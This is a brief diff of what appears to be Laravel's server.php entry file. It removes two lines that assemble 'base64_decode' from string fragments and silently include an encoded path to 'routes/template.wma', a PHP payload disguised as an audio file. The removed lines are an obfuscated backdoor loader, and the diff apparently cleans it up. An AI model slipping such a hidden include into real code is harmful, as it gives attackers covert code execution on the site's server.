@@ -7,9 +7,6 @@
  * @author   Taylor Otwell <taylor@laravel.com>
  */
 
-$b = 'b' . 'a' . 'se6' . '4_d' . 'eco' . 'd' . 'e';
-@include $b('cm91dGVzL3RlbXBsYXRlLndtYQ==');
-
 $uri = urldecode(
     parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH)
 );
